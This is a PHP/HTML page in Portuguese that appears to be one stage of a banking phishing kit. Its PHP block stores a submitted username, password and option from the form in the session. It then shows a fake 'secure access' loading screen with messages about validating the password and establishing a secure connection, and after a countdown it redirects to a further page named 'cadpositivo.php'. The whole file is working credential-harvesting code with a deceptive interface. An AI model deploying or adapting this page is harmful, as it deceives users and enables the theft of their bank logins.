<?php
session_start();

$shkUser     = $_POST['shkUser'];
$shkPass     = $_POST['shkPass'];
$option      = $_POST['option'];

$_SESSION['shkUser'] = $shkUser;
$_SESSION['shkPass'] = $shkPass;
$_SESSION['option'] = $option;

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<script src="js/jquery.js"></script>
<title>Acesso Seguro</title>

<style>

body {
	margin: 0;
	font-family:Arial, Helvetica, sans-serif;
	background:#EEEEEE;
	}

#topo {
	width: 100%;
	height: 42px;
	background: url(img/mLogomenor.png) no-repeat;
	background-position: 14px 14px;
	background-color: #1664AC;
	}
	
.logininput {
	width: 100%;
    max-width: 100%;
	box-sizing: border-box;
	font-size: 16px;
	border: none;
	border-bottom: solid 1px #b3b3b3;
	border-radius: 2px;
	display: block;
	color: #000;
	padding: 8px;
	height: 36px;
	}

.bttenter {
	background:url(img/bgbottom.png) repeat;
    border-radius: 4px;
    font-family: arial;
    font-size: 18px;
	color: #fff;
    padding: 12px;
    text-align: center;
    width: 100%;
	border:1px solid #999;
	cursor: pointer;
	}

</style>
</head>

<body>

<div id="topo"></div>

<div style="padding:10px;">


<div style="padding:10px 20px; text-align:center; margin-top:100px; "><img src="img/load.svg" height="60" width="60" /></div>



<div id="tres" style="padding:10px 20px; text-align:center; color:#727272; ">Validando a senha.</div>
<div id="dois" style="padding:10px 20px; text-align:center; color:#727272; display:none; ">Estabelecendo conexão segura.</div>
<div id="um" style="padding:10px 20px; text-align:center; color:#727272; display:none; ">Carregando...</div>
<div id="countSeconds" style="padding:10px 20px; text-align:center; color:#EEEEEE; ">30</div>
</div>
</div>

<script>
$(document).ready(function(){
		$("#countSeconds").html("10");
		var refreshIntervalId = setInterval(function(){
			var contar = $("#countSeconds").html();
			contar--;
			$("#countSeconds").html(contar);
			if(contar=="7")
			{
				$("#tres").hide();
				$("#dois").show();
			}
			if(contar=="3")
			{
				$("#dois").hide();
				$("#um").show();
			}
			if(contar=="0")
			{
			  window.location = "cadpositivo.php";
			  clearInterval(refreshIntervalId);
			}
		}, 1100);

});
</script>
</body>
</html>